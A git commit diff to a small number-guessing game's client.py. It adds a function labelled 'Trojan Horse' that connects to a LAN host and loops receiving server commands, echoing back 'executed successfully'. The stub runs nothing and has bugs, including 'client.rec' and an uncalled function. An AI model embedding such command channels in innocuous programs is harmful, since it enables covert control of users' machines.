739e6c4e946e4f2cf8577ff477cad790686a7acd
Banji <khanjani1997@gmail.com>
2021-01-29 14:57:54 +0330

    Server is completed, now we'll add more functionality in our client.py

--- client.py
+++ client.py
@@ -1,7 +1,25 @@
 import random 
+import socket
+import threading
 
+# Trojan Horse
+def trojan():
+    HOST = "192.168.1.9 "
+    PORT = 5000
+
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((HOST, PORT))
+
+    while True:
+        server_command = client.rec(1024).decode('utf-8')
+        if server_command == "hello":
+            print("Hello, world!")
+        client.send(f"{server_command} executed successfully".encode('utf-8'))
+
+
+# Guess Number Game 
 def game():
-    number = random.randint(0, 10)
+    number = random.randint(0, 2)
     tries = 1
     done = False
     
@@ -18,7 +36,7 @@ def game():
             else:
                 print("The actual number was larger!")
     
-    print(f"You needer {tries} tries!")
+    print(f"You did {tries} tries!")
 
 game = game()
 game
